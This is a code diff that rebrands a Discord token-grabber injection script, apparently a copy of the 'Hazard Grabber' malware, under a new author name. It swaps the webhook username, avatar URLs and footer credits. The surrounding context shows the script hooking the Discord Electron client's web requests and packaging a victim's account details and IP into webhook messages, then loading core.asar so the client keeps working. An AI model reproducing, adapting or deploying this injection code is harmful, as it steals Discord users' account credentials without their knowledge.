@@ -192,9 +192,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         const json = JSON.parse(info);
 
         var params = {
-            username: "Hazard Grabber",
+            username: "Yuri собака",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/898328928157061140/898342525096583228/descarga.jpg",
             embeds: [
                 {
                     "color": 16507654,
@@ -215,7 +215,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "Token Grabber by Yuri собака#9804"
                     }
                 }
             ]
@@ -244,9 +244,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
             var json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Yuri собака",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/898328928157061140/898342525096583228/descarga.jpg",
                 embeds: [
                     {
                         "color": 16507654,
@@ -272,7 +272,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Token Grabber By Yuri собака#9804"
                         }                 
                     }
                 ]
@@ -302,9 +302,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     `, true).then((ip) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Yuri собака",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/898328928157061140/898342525096583228/descarga.jpg",
             embeds: [
                 {
                     "color": 16507654,
@@ -330,7 +330,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "Token Grabber By Yuri собака#9804"
                     }                
                 }
             ]
@@ -360,9 +360,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Yuri собака",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/898328928157061140/898342525096583228/descarga.jpg",
             embeds: [
                 {
                     "color": 16507654,
@@ -388,7 +388,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "Token Grabber By Yuri собака#9804"
                     }
                 }
             ]
@@ -456,3 +456,4 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
       }
   });
   module.exports = require('./core.asar');
+
